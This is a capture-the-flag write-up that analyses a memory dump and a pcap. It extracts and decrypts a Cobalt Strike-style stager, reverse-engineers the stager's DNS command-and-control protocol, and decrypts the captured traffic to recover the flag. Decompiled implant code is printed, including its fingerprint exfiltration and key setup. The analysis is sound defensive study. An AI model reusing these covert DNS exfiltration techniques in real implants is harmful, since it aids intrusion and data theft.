As the challenge's description says, we are given a pcap file, along with a
memory dump. A first looks at the pcap file show a lot of traffic, and instead
of going blindly, let's have a look on the dump file instead.

The dump file is a classic Minidump file, that opens nicely in WinDBG (I used
WinDBG preview because it has a lot nicer interface). We can see there are two
threads launched, both sleeping. So we have to analyze the backtrace of the
threads to have a clue on what's going on.

The first thread seems to call SleepEx from ntupdate.exe directly, which can
be legitimate. But, in the second thread, SleepEx is called from `0x0018ef06`
which seem more suspicious. To understand what happens, let's dump
ntupdate.exe (with `.writemem z:\ntupdate.mem 400000 L?004e000` WinDBG
command, module size is `0x4e000` according to windbg's module view), and
"unmap" the PE [with
this](https://github.com/hasherezade/libpeconv/tree/master/pe_unmapper), yeah
I was lazy to code my own tool.

After opening the "reconstructed" PE in IDA, the first thing we notice is the
`%c%c%c%c%c%c%c%c%cMSSE-%d-server`, which indicates it seems to be a Cobalt
Stike stager (and code really looks like this
https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/). Good
luck, the binary embeds the payload, which can be decrypted using this
IDAPython script (don't judge my high quality variable naming):

```python  
sheep = []  
key = b"\x13\x4a\x5b\x22"  
for i in range(0x40000):  
   sheep.append(idaapi.get_byte(0x404008 + i) ^ key[i % 4])

f = open("/tmp/payload.dump", "wb")  
f.write(bytes(sheep))  
f.close()  
```

We get some garbage "headers", followed by a classic MZ header: after removing
the garbage, we get a PE file that loads nicely in IDA, and we are lucky
because it's that PE which is mapped in 0x180000 (the mysterious code in the
second thread). So we can see that the sleep is called in a function that does
DNS resolving.

A few moments later, after having analyzed a part of the implant, I figured
that it contacted its C&C with DNS, and had several "handlers" for it:  
- if the requested name starts by "www.", the malware sends RSA-encrypted "fingerprint" of the machine to the C&C, along with an AES sesion key to talk to the server  
- if the requested name start directly by a random hex number, the bot queries orders from the C&C. The response is in a A DNS record and xored with "8.8.4.4" IP in big endian  
- If the requested name starts by "api.", the client first sends a A request to get the payload size (always xored by 8.8.4.4), and then issues TXT queries, and server replies with base64 data  
- If the request starts by "cdn.", then the first A request contains payload size, and further A requests the payload data xored by 8.8.4.4 (big endian DWORD)  
- There is also "www6." handler, which seem to be the same with cdn. but with AAAA records (IPv6 addresses are longer, so more data can be sent as response)  
```c  
   if ( (unsigned int)QueryCnCOrder(fetchOrderDns, &ip_obf) )  
     {  
       v15 = v12 ^ ntohl(ip_obf);  
       ip_obf = v15;  
       if ( v15 && (v15 & 0xFFFFFFF0) == 240 )  
       {  
         sub_18000EF14(v15);  
         v16 = ip_obf;  
         if ( (ip_obf & 1) != 0 )  
         {  
           exfiltrateData(v13, a1, (__int64)&encryptedFingerprint, encryptedFingerprintSize);  
           v16 = ip_obf;  
         }  
         if ( (v16 & 2) != 0 )  
         {  
           cncLen = get_encrypted_int(4u);  
           v18 = sendTxtRequest(a1, (char *)bufferFromServer, cncLen);  
         }  
         else if ( (v16 & 4) != 0 )  
         {  
           www6Len = get_encrypted_int(4u);  
           v18 = sendWww6Typ(a1, bufferFromServer, www6Len);  
         }  
         else  
         {  
           cdnLen = get_encrypted_int(4u);  
           v18 = sendCdnRequest(a1, bufferFromServer, cdnLen);  
         }  
         if ( v18 > 0 )  
         {  
           v21 = decryptResponse(bufferFromServer, v18);  
           if ( v21 > 0 )  
             doStuffWithResponse(bufferFromServer, (unsigned int)v21);  
         }  
       }  
```

Unfortunately, this data is encrypted by the AES session key, and since we
only have the last part of the "fingerprint", we'll need to figure out where
the AES key is generated/stored, and extract it from the dump with WinDBG.
Before the "main" loop of DNS queries, some initialization function are quite
interesting:  
```c  
void *__fastcall GrabInfo(GetInfoStruct *Src, unsigned int len)  
{  
 DWORD CurrentProcessId; // ebx  
 DWORD TickCount; // eax  
 char someflags; // bl  
 HANDLE CurrentProcess; // rax  
 DWORD v8; // eax  
 unsigned int v9; // edi  
 __int64 pubKey; // rax  
 block_iterator a1; // [rsp+30h] [rbp-20h] BYREF  
 BYTE rand1[16]; // [rsp+40h] [rbp-10h] BYREF  
 __int16 a2; // [rsp+90h] [rbp+40h] BYREF  
 __int16 OEMCP; // [rsp+98h] [rbp+48h] BYREF

 a2 = GetACP();  
 OEMCP = GetOEMCP();  
 randomGenerator(rand1, 0x10u, 0i64);  
 aesCreateContext((__int64)rand1);  
 CurrentProcessId = GetCurrentProcessId();  
 TickCount = GetTickCount();

 /* some snipped useless stuff */

 /* construct the blob to be sent to the C&C */  
 make_block_iterator(&a1, Src, len);  
 packMem(&a1, rand1, 16);  
 packMem(&a1, &a2, 2);  
 packMem(&a1, &OEMCP, 2);  
 pack_int_bigendian(&a1, sessionRandIdentifier);  
 v8 = GetCurrentProcessId();  
 pack_int_bigendian(&a1, v8);  
 pack_short_bigendian(&a1, 0);  
 pack_char(&a1, someflags);  
 sub_180014750(&a1;;  
 v9 = set_buf(&a1;;  
 memset(&encryptedFingerprint, 0, 0x400ui64);  
 encryptedFingerprintSize = 128;  
 memmove(&encryptedFingerprint, Src, v9);

 /* decode pubkey and encrypt blob */  
 pubKey = cryptoshitFunc(7i64);  
 rsa_encrypt(pubKey, (int)Src, v9, (int)&encryptedFingerprint,
(__int64)&encryptedFingerprintSize);  
 /* wipe cleartext blob */  
 return memset(Src, 0, v9);  
}  
```

We can see that a random 16-byte buffer is filled, which is then passed to a
"aesCreateContext" function which does this:  
```c  
__int64 __fastcall aesCreateContext(__int64 a1)  
{  
 __int64 result; // rax  
 __int128 hash[2]; // [rsp+30h] [rbp-28h] BYREF  
 unsigned int hashlen; // [rsp+68h] [rbp+10h] BYREF

 hashlen = 32;  
 addHashTable(&sha256_crypt_callback);  
 hashMethodIdx = lookup_hash_func("sha256");  
 if ( (unsigned int)call_hash_method(hashMethodIdx, a1, 0x10u, hash, &hashlen)
)  
   exit(1);  
 aes_key = hash[0];  
 hmac_key = hash[1];  
 iv = *(_OWORD *)"abcdefghijklmnop";  
 constructCryptoTable(&aes_crypt_callback);  
 cryptoMethodIdx = lookup_crypto_func("aes");  
 result = aes_create_context((unsigned int *)&aes_key, 16, 0, aes_ctx);  
 if ( (_DWORD)result )  
   exit(1);  
 return result;  
}  
```  
While the initial seed is forever lost because stored as local var, the AES
key and HMAC keys derived from SHA256 hash of the "initial seed" are stored in
the .data section of the binary, making them "easy" to extract from the dump
(just convert imagebase from 0x180000000 to 0x180000).

Now come the final part of the challenge, parsing the pcap and reconstructing
and decrypting the traffic between the C&C and the bot. For this, I made this
quick and dirty Python script using pcapy and ImPacket:

```python  
#!/usr/bin/python

import base64  
import struct  
import pcapy  
import impacket.ImpactDecoder as Decoders  
import impacket.ImpactPacket as Packets  
from impacket.dns import DNS  
from Crypto.Cipher import AES

pattern = 0x08080404  
key =
b"U\n\xe2\x988\xb3\xdc(X\rl\x0f\xf1\x96\xde\xb2\x0e3\xaf[\xf1\x9f\xe0\x16\x1e\x0b\xa9x\x00fp\xe8"

pcap = pcapy.open_offline("the_compromise/traffic.pcap")  
CLIENT_IP = '192.168.111.6'

def decrypt(data):  
   aeskey = key[0:16]  
   iv = b"abcdefghijklmnop"  
   aes = AES.new(aeskey, AES.MODE_CBC, iv)  
   return aes.decrypt(data[:-16])

def get_int_raw_resp(dns_resp: DNS):  
   data = dns_resp.get_body_as_string()  
  
   offset   = 0  
   qdcount = dns_resp.get_qdcount()  
   for _ in range(qdcount): # number of questions  
       offset, qname = dns_resp.parseCompressedMessage(data, offset)  
       qtype  = data[offset:offset+2]  
       offset  += 2  
       qclass = data[offset:offset+2]  
       offset  += 2  
       qtype  = struct.unpack("!H", qtype)[0]  
       qclass = struct.unpack("!H", qclass)[0]

   offset, _ = dns_resp.parseCompressedMessage(data, offset)  
   qtype  = data[offset:offset+2]  
   qtype  = struct.unpack("!H", qtype)[0]  
   offset  += 2

   qclass = data[offset:offset+2]  
   qclass = struct.unpack("!H", qclass)[0]  
   offset  += 2

   qttl_raw = data[offset:offset+4]  
   qttl = struct.unpack("!L", qttl_raw)[0]  
   offset  += 4

   qrdlength = data[offset:offset+2]  
   qrdlength = struct.unpack("!H", qrdlength)[0]  
   offset  += 2

   return qtype, data[offset:offset+qrdlength]

def get_next_dns_pkt():  
   ethernet_decoder = Decoders.EthDecoder()  
   ip_decoder = Decoders.IPDecoder()

   hdr = True  
   packets = 0

   while hdr is not None:  
       hdr, body = pcap.next()  
       eth = ethernet_decoder.decode(body)  
       if eth.get_ether_type() != Packets.IP.ethertype:  
           continue  
       ip = ip_decoder.decode(eth.get_data_as_string())  
       if CLIENT_IP not in [ip.get_ip_src(), ip.get_ip_dst()]:  
           continue  
       if ip.get_ip_p() != Packets.UDP.protocol:  
           continue  
       udp = ip_decoder.udp_decoder.decode(ip.get_data_as_string())  
       if udp.get_uh_dport() != 53 and udp.get_uh_sport() != 53:  
           continue  
       if b"thedarkestside\x03org" not in body:  
           continue  
       dns = DNS(udp.get_data_as_string())  
       if (dns.get_flags() & 0x8000) == 0:  
           continue  
       packets += 1  
       if packets < 2:  
           continue  
       yield (ip.get_ip_src(), ip.get_ip_dst(), dns)

pkts = get_next_dns_pkt()  
while True:  
   buffer = b""  
   (src, dst, dns) = next(pkts)  
   qry = dns.get_questions()[0]  
   qry_array = qry[0].split(b".")  
   if qry_array[0] == b"api":  
       # base64 sent information  
       type, rawdata = get_int_raw_resp(dns)  
       if type == 1:  
           buflen = struct.unpack("!L", rawdata)[0] ^ pattern  
       trunc = buflen  
       while buflen > 0:  
           src, dst, resp = next(pkts)  
           type, rawdata = get_int_raw_resp(resp)  
           rawdata = base64.b64decode(rawdata)  
           buflen -= len(rawdata)  
           buffer += rawdata  
       buffer = buffer[:trunc]  
       print(decrypt(buffer))  
   elif qry_array[0] == b"cdn":  
       type, rawdata = get_int_raw_resp(resp)  
       if type == 1:  
           buflen = struct.unpack("!L", rawdata)[0] ^ pattern  
           while len(buffer) < buflen:  
               src, dst, resp = next(pkts)  
               type, rawdata = get_int_raw_resp(resp)  
               buffer += rawdata  
           print(decrypt(buffer))  
   elif qry_array[0] == b"post":  
       alen = qry_array[1]  
       len_chunk = int(str(alen[1:], "ascii"), 16)  
       while len(buffer) < len_chunk:  
           (src, dst, dns) = next(pkts)  
           qry = dns.get_questions()[0]  
           qry_array = qry[0].split(b".")  
           num_chunks = qry_array[1][0]  
           num_chunks -= 0x30  
           buffer += bytes.fromhex(str(qry_array[1][1:], 'ascii'))  
           if num_chunks >= 2:  
               buffer += bytes.fromhex(str(qry_array[2], 'ascii'))  
           if num_chunks == 3:  
               buffer += bytes.fromhex(str(qry_array[3], 'ascii'))  
       print(decrypt(buffer))  
```

which gives us the flag: `CSR{Schro3dinger%%3quation_}`

Author: [supersnail](https://github.com/aaSSfxxx)

Original writeup (https://ret2school.github.io/post/compromise/).